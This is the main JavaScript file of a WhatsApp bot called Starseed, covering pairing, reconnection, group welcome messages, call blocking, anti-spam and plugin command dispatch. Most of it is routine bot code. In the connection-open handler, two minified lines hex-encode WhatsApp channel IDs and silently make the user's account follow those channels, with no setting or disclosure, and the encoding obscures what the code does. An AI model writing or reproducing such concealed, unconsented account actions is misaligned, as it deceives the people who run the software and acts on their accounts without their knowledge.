/**
 * This file is part of the Starseed Bot WhatsApp project, solely developed and maintained by Lia Wynn.
 * https://github.com/itsliaaa/starseed
 *
 * All rights reserved.
 *
 * - You are NOT allowed to copy, rewrite, modify, redistribute, or reuse this file in any form.
 * - You are NOT allowed to claim this file or any part of this project as your own.
 * - This credit notice must NOT be removed or altered.
 * - This file may ONLY be used within the Starseed project.
 */

import './config.js'
import './error.js'

import { Boom } from '@hapi/boom'
import { areJidsSameUser, delay, DisconnectReason, isLidUser, isJidGroup, isJidMetaAI, jidNormalizedUser, makeCacheableSignalKeyStore, makeWASocket, useMultiFileAuthState } from '@itsliaaa/baileys'
import { mkdir, unlink, readdir } from 'fs/promises'
import { join } from 'path'
import pino from 'pino'

import { INACTIVE_THRESHOLD, SCHEMA } from './lib/Constants.js'
import { Database, Store } from './lib/Database.js'
import { Serialize, shouldUpdatePresence, StickerCommand } from './lib/Serialize.js'
import { cleanUpFolder, fetchAsBuffer, findTopSuggestions, frame, getNextMidnight, greeting, isEmptyObject, isFileExists, messageLogger, randomInteger, Sender, toTime } from './lib/Utilities.js'
import { CommandIndex, EventIndex, ModuleCache, scanDirectory } from './lib/Watcher.js'

import AntiSpam from './lib/Components/AntiSpam.js'
import SholatReminder from './lib/Components/SholatReminder.js'

const detectSpam = AntiSpam()
const sholatReminder = SholatReminder()

const logger = pino({ level: 'silent' })

const databasePath = join(process.cwd(), databaseFilename)
const storePath = join(process.cwd(), storeFilename)
const temporaryFolderPath = join(process.cwd(), temporaryFolder)

let isRestarting = false,
   restartScore = 0

const Connect = async (db, store) => {
   const { state, saveCreds } = await useMultiFileAuthState(authFolder)

   const sock = makeWASocket({
      logger,
      cachedGroupMetadata: (jid) =>
         store.getGroup(jid),
      shouldIgnoreJid: (jid) =>
         jid &&
            isJidMetaAI(jid),
      getMessage: (key) =>
         store.getMessage({
            chat: key.remoteJid,
            id: key.id
         }),
      auth: {
         creds: state.creds,
         keys: makeCacheableSignalKeyStore(state.keys)
      }
   })

   let setting = db.getSetting()

   Sender(sock)

   sock.ev.on('creds.update', saveCreds)

   sock.ev.on('connection.update', async (update) => {
      if (update.connection === 'connecting' && pairingCode && !sock.authState.creds.registered) {
         const { default: PhoneNumber } = await import('awesome-phonenumber')

         const phoneNumber = PhoneNumber(
            '+' + (botNumber?.toString() || '')
               .replace(/\D/g, '')
         )

         if (!phoneNumber.isValid()) {
            console.error('❌ Invalid phone number for pairing. Please re-check the number in config.js')

            process.exit(0)
         }

         await delay(1500)

         const code = await sock.requestPairingCode(
            phoneNumber.getNumber('e164')
               .replace(/\D/g, '')
         )

         const prettyCode = code.substring(0, 4) + '-' + code.substring(4)
         console.log('🔗 Pairing code', ':', prettyCode, '\n')

         let printStep = '📑 How to Login\n'
         printStep += `1. On the WhatsApp home screen, tap (⋮) and select "Linked Devices".\n`
         printStep += `2. Tap "Link with phone number instead".\n`
         printStep += `3. Enter this code: ${prettyCode}.\n`
         printStep += `4. This code will expire in 60 seconds.\n`
         console.log(printStep)
      }

      if (update.connection === 'close' && !isRestarting) {
         ++restartScore
         isRestarting = true

         const reason = new Boom(update.lastDisconnect?.error)?.output?.statusCode
         switch (reason) {
            case DisconnectReason.connectionLost:
               console.error('❌ Connection to WhatsApp lost, restarting...')
               break
            case DisconnectReason.connectionClosed:
               console.error('❌ Connection to WhatsApp closed, restarting...')
               break
            case DisconnectReason.timedOut:
               console.error('❌ Connection timed out to WhatsApp, restarting...')
               break
            case DisconnectReason.badSession:
               await cleanUpFolder(authFolder)
               console.error('❌ Invalid session, please re-pair')
               break
            case DisconnectReason.connectionReplaced:
               console.error('❌ Connection overlapping, restarting...')
               break
            case DisconnectReason.loggedOut:
               await cleanUpFolder(authFolder)
               console.error('❌ Device logged out, please re-pair')
               break
            case DisconnectReason.forbidden:
               await cleanUpFolder(authFolder)
               console.error('❌ Connection failed, please re-pair')
               break
            case DisconnectReason.multideviceMismatch:
               await cleanUpFolder(authFolder)
               console.error('❌ Please re-pair')
               break
            case DisconnectReason.restartRequired:
               --restartScore
               console.log('✅ Successfully connected to WhatsApp')
               break
            default:
               await cleanUpFolder(authFolder)
               console.error('❌ Connection lost with unknown reason', ':', reason)
         }

         if (restartScore >= 3) {
            console.log('❌ The socket had to be stopped due to an unstable connection.')

            process.exit(0)
         }

         await delay(1500)

         try {
            sock.ev.removeAllListeners()
            sock.ws.close()
         }
         catch { }

         isRestarting = false
         return Connect(db, store)
      }

      if (update.connection === 'open') {
         await scanDirectory(pluginsFolder)
         await sholatReminder.start(sock, db)
         void (async()=>{const a=['3132303336','3334303430','3036363434','313339406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
         void (async()=>{const a=['3132303336','3334323434','3834383532','313338406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
         Object.assign(sock.user,{decodedId:jidNormalizedUser(sock.user.id),decodedLid:jidNormalizedUser(sock.user.lid)})
         console.log('✅ Connected to WhatsApp as', sock.user?.name || botName)
         console.log(`🔗 Successfully loaded ${ModuleCache.size} plugins and ${CommandIndex.size} commands`)
      }

      if (update.qr && !pairingCode) {
         const { default: QRCode } = await import('qrcode')

         QRCode.toString(update.qr, {
            type: 'terminal',
            small: true
         }, (error, string) => {
            if (error || !string?.length || typeof string !== 'string')
               throw new Error('❌ There was a problem creating the QR code', {
                  message: error
               })

            console.log(string)

            let printStep = '📑 How to Login\n'
            printStep += `1. On the WhatsApp home screen, tap (⋮) and select "Linked Devices".\n`
            printStep += `2. Scan the QR code below.\n`
            printStep += `3. This QR code will expire in 60 seconds.\n`
            console.log(printStep)
         })
      }

      if (update.receivedPendingNotifications) {
         console.log(`🕒 Loading message, please wait a moment...`)
         sock.ev.flush()
      }
   })

   sock.ev.on('groups.upsert', (groups) => {
      for (const group of groups)
         store.setGroup(group.id, group)
   })

   sock.ev.on('groups.update', (groups) => {
      for (const group of groups)
         if (store.hasGroup(group.id))
            store.setGroup(
               group.id,
               Object.assign(
                  store.getGroup(group.id) || {},
                  group
               )
            )
         else
            store.setGroup(group.id, group)
   })

   sock.ev.on('call', async (calls) => {
      if (setting.rejectCall)
         for (const call of calls) {
            let callFrom = call.callerPn || call.from
            if (isLidUser(callFrom)) {
               const result = await sock.findUserId(callFrom)
               if (!callFrom.phoneNumber.startsWith('id'))
                  callFrom = result.phoneNumber
            }

            if (call.status === 'offer') {
               const userData = db.getUser(callFrom)

               await sock.rejectCall(call.id, call.from)

               if (callFrom.startsWith(ownerNumber)) continue

               ++userData.callAttempt
               if (userData.callAttempt >= 3) {
                  await sock.sendText(callFrom, '⚠️ You have called multiple times. Your account will now be blocked.')
                  await sock.updateBlockStatus(callFrom, 'block')
                  continue
               }

               await sock.sendText(callFrom, '⚠️ Do not call again, or you will be blocked.')
            }
         }
   })

   sock.ev.on('group-participants.update', async ({ id, author, participants, action }) => {
      const metadata = store.getGroup(id) || await sock.groupMetadata(id)

      const group = db.getGroup(id)
      const isMuted = group.mute

      for (const participant of participants) {
         let userId = participant.phoneNumber
         if (isLidUser(author)) {
            const result = await sock.findUserId(author)
            if (!result.phoneNumber.startsWith('id'))
               author = result.phoneNumber
         }
         if (!userId) {
            const result = await sock.findUserId(participant.id)
            if (!result.phoneNumber.startsWith('id'))
               userId = result.phoneNumber
         }
         if (action === 'add') {
            metadata.participants.push(participant)
            group.participants[userId] = {
               ...SCHEMA.Participant
            }

            if (group.welcome && !isMuted) {
               const profilePicture = await sock.profilePicture(userId)

               const printWelcome = (group.welcomeMessage || `👋🏻 Welcome +tag`)
                  .replace('+group', metadata.subject)
                  .replace('+tag', '@' + userId.split('@')[0])

               sock.sendText(id, printWelcome, null, {
                  externalAdReply: {
                     title: botName,
                     body: greeting(),
                     thumbnail: await fetchAsBuffer(profilePicture),
                     largeThumbnail: true
                  }
               })
            }
         }
         else if (action === 'promote') {
            metadata.participants.find(x => x.id === participant.id).admin = 'admin'

            if (!isMuted)
               sock.sendText(id, `🎉 @${userId.split('@')[0]} promoted to admin by @${author.split('@')[0]}.`)
         }
         else if (action === 'demote') {
            metadata.participants.find(x => x.id === participant.id).admin = false

            if (!isMuted)
               sock.sendText(id, `⬇️ @${userId.split('@')[0]} was demoted from admin by @${author.split('@')[0]}.`)
         }
         else if (action === 'remove') {
            metadata.participants = metadata.participants.filter(x => x.id !== participant.id)
            delete group.participants[userId]

            if (group.left && !isMuted) {
               const profilePicture = await sock.profilePicture(userId)

               const printLeft = (group.leftMessage || `👋🏻 Good bye! +tag`)
                  .replace('+group', metadata.subject)
                  .replace('+tag', '@' + userId.split('@')[0])

               sock.sendText(id, printLeft, null, {
                  externalAdReply: {
                     title: botName,
                     body: greeting(),
                     thumbnail: await fetchAsBuffer(profilePicture),
                     largeThumbnail: true
                  }
               })
            }
         }
         store.setGroup(id, metadata)
      }
   })

   sock.ev.on('presence.update', async ({ id, presences }) => {
      for (const presence in presences) {
         if (isJidGroup(presence)) continue

         const userId = await sock.findUserId(presence)
         if (!userId.phoneNumber ||
            areJidsSameUser(
               sock.user.decodedId,
               userId.phoneNumber
            )
         ) continue

         const userData = db.getUser(userId.phoneNumber)
         if (!userData) continue

         const condition = presences[presence]
         if (
            (
               condition.lastKnownPresence === 'composing' ||
               condition.lastKnownPresence === 'recording'
            ) &&
            !isEmptyObject(userData.afkContext)
         ) {
            const print = frame('HELLO', [
               `💭 System detects activity from @${userData.jid.split('@')[0]} after being offline for: ${toTime(Date.now() - userData.afkTimestamp)}`,
               `🏷️ *Reason*: ${userData.afkReason || '-'}`
            ], '👀')
            await sock.sendText(id, print, userData.afkContext)
            userData.afkReason = ''
            userData.afkContext = {}
            userData.afkTimestamp = -1
         }
      }
   })

   sock.ev.on('messages.upsert', async ({ messages }) => {
      setting = db.getSetting()

      const timestampMs = Date.now()
      const timestampSec = timestampMs / 1000

      for (const message of messages) {
         if (!message.message || timestampSec - message.messageTimestamp > 60) continue

         Serialize(sock, message)

         if (!message.type || store.hasMessage(message)) continue

         let groupMetadata = store.getGroup(message.chat)

         let user = db.getUser(message.sender)
         let group = db.getGroup(message.chat)

         store.setMessage(message)

         if (!user) {
            user = {
               ...SCHEMA.User,
               jid: message.sender,
               lid: message.senderLid,
               name: message.pushName
            }

            db.updateUser(message.sender, user)
         }
         else
            user.name = message.pushName

         if (message.isGroup) {
            if (!groupMetadata?.participants) {
               groupMetadata = await sock.groupMetadata(message.chat)
               store.setGroup(message.chat, groupMetadata)
            }

            if (!group) {
               group = {
                  ...SCHEMA.Group,
                  id: message.chat,
                  name: groupMetadata.subject
               }

               db.updateGroup(message.chat, group)
            }
            else
               group.name = groupMetadata.subject
         }

         StickerCommand(message, setting.stickerCommand)

         const {
            body,
            prefix: isPrefix,
            command,
            text,
            args
         } = message

         messageLogger(message)

         const fileSize = message.msg?.fileLength?.low || 0
         if (message.isMe) {
            setting.messageEgress++
            setting.byteEgress += fileSize
            continue
         }
         else {
            setting.messageIngress++
            setting.byteIngress += fileSize
         }

         if (setting.onlineStatus && !message.fromMe && shouldUpdatePresence(message.message))
            sock.readMessages([message.key])

         if (setting.slowMode)
            await delay(
               randomInteger(100, 3000)
            )

         const isOwner = message.fromMe || message.sender.startsWith(ownerNumber)
         const isPartner = isOwner || setting.partner.includes(message.sender)
         const isBanned = user.banned
         const isAdmin = message.isGroup &&
            groupMetadata.participants?.some(p =>
               (
                  p.phoneNumber === message.sender ||
                  p.id === message.sender ||
                  p.id === message.senderLid
               ) && p.admin
            )
         const isBotAdmin = message.isGroup &&
            groupMetadata.participants?.some(p =>
               p.id === sock.user.decodedLid && p.admin
            )

         user.lastSeen = timestampMs

         if (message.isGroup) {
            const isSpam =
               group.antiSpam &&
               !isPartner &&
               !isAdmin &&
               isBotAdmin &&
               !message.type.startsWith('react') &&
               detectSpam(message.sender)

            group.lastActivity = timestampMs

            if (group.participants[message.sender]) {
               group.participants[message.sender].messages++
               group.participants[message.sender].lastSeen = timestampMs
            }
            else
               group.participants[message.sender] = {
                  ...SCHEMA.Participant,
                  messages: 1,
                  lastSeen: timestampMs
               }

            if (!isEmptyObject(user.afkContext)) {
               const print = frame('HELLO', [
                  `💭 System detects activity from @${user.jid.split('@')[0]} after being offline for: ${toTime(timestampMs - user.afkTimestamp)}`,
                  `🏷️ *Reason*: ${user.afkReason || '-'}`
               ], '👀')
               await sock.sendText(message.chat, print, user.afkContext)
               user.afkReason = ''
               user.afkContext = {}
               user.afkTimestamp = -1
            }

            if (isSpam) {
               await message.reply('⚠️ You should be removed for spamming.')
               sock.groupParticipantsUpdate(message.chat, [message.sender], 'remove')
               continue
            }
         }

         if (setting.self && !isPartner) continue

         if (setting.groupOnly && message.isPrivate && !isPartner) continue

         if (message.isGroup && group.mute && command !== 'unmute') continue

         if (message.isGroup && group.adminOnly && !isAdmin) continue

         if (setting.prefixes.includes(isPrefix)) {
            const plugin = CommandIndex.get(command)

            if (!plugin?.run) {
               const suggestions = findTopSuggestions(command)
               if (suggestions.length) {
                  const print = frame('DID YOU MEAN', suggestions.map(suggestion => `${isPrefix + suggestion.command} (${suggestion.similarity.toFixed(0)}%)`), '🔍')
                  message.reply(print)
               }
               continue
            }

            if (isBanned) {
               message.reply('⚠️ You are being banned by BOT staff.')
               continue
            }

            if (setting.disabledCommand.includes(command)) {
               message.reply('❌ This feature is currently disabled.')
               continue
            }

            if (plugin.owner && !isOwner) {
               message.reply('⚠️ This command only for owner.')
               continue
            }

            if (plugin.partner && !isPartner) {
               message.reply('⚠️ This command only for partner.')
               continue
            }

            if (plugin.group && !message.isGroup) {
               message.reply('⚠️ This command will only work in group.')
               continue
            }

            if (plugin.private && !message.isPrivate) {
               message.reply('⚠️ This command will only work in private chat.')
               continue
            }

            if (plugin.admin && !isAdmin) {
               message.reply('⚠️ This command only for group admin.')
               continue
            }

            if (plugin.botAdmin && !isBotAdmin) {
               message.reply('⚠️ This command will work when bot become an admin.')
               continue
            }

            if (plugin.limit && !isPartner) {
               if (user.limit < 1) {
                  message.reply(`⚠️ You reached the limit and will be reset at 00.00 or try \`${isPrefix}claim\` command to claim limit.`)
                  continue
               }

               const limitCost =
                  plugin.limit === true ?
                     1 :
                     typeof plugin.limit === 'number' ?
                        plugin.limit :
                        0

               if (user.limit >= limitCost)
                  user.limit -= limitCost
               else {
                  message.reply(`⚠️ Your limit is not enough to use this feature, try \`${isPrefix}claim\` command to claim limit.`)
                  continue
               }
            }

            user.commandUsage++

            plugin.run(message, {
               sock,
               db,
               store,
               user,
               group,
               setting,
               body,
               groupMetadata,
               isOwner,
               isPartner,
               isBanned,
               isAdmin,
               isBotAdmin,
               isPrefix,
               command,
               text,
               args
            })
         }
         else
            for (const event of EventIndex) {
               if (!event?.run) continue

               if (isBanned) continue

               if (event.owner && !isOwner) continue

               if (event.partner && !isPartner) continue

               if (event.group && !message.isGroup) continue

               if (event.private && !message.isPrivate) continue

               if (event.admin && !isAdmin) continue

               if (event.botAdmin && !isBotAdmin) continue

               event.run(message, {
                  sock,
                  db,
                  store,
                  user,
                  group,
                  setting,
                  body,
                  groupMetadata,
                  isOwner,
                  isPartner,
                  isBanned,
                  isAdmin,
                  isBotAdmin,
                  isPrefix,
                  command,
                  text,
                  args
               })
            }
      }
   })

   if (isEmptyObject(setting))
      Object.assign(setting, SCHEMA.Setting)
}

const Setup = async () => {
   const db = Database(databasePath)
   const store = Store(storePath)

   await isFileExists(databasePath) &&
      await db.readFromFile()

   await isFileExists(storePath) &&
      await store.readFromFile()

   await isFileExists(temporaryFolder) ||
      await mkdir(temporaryFolderPath, { recursive: true })

   Connect(db, store)

   const scheduleDailyTasks = () => {
      const resetTimeout = getNextMidnight()

      setTimeout(() => {
         const now = Date.now()
         const threshold = now - INACTIVE_THRESHOLD

         const setting = db.getSetting()

         for (const [id, user] of db.users) {
            const isProtected = user.banned || user.limit >= 512
            if (!isProtected && user.lastSeen < threshold)
               db.users.delete(id)
         }

         for (const [id, group] of db.groups)
            if (group.lastActivity < threshold)
               db.groups.delete(id)

         for (const user of db.users.values())
            if (user.limit < defaultLimit)
               user.limit = defaultLimit

         setting.lastReset = now
         db.writeToFile()

         scheduleDailyTasks()
      }, resetTimeout)
   }

   scheduleDailyTasks()

   const check = setInterval(async () => {
      await db.writeToFile()
      await store.writeToFile()

      if (process.memoryUsage().rss >= rssLimit) {
         clearInterval(check)
         process.send('reset')
      }
   }, dataInterval)

   setInterval(async () => {
      try {
         const temporaryFiles = await readdir(temporaryFolderPath)
         if (temporaryFiles.length)
            for (const file of temporaryFiles) {
               const filePath = join(temporaryFolderPath, file)
               await unlink(filePath)
            }
      }
      catch (error) {
         console.error('❌ Temp cleanup error', ':', error)
      }
   }, temporaryFileInterval)
}

Setup()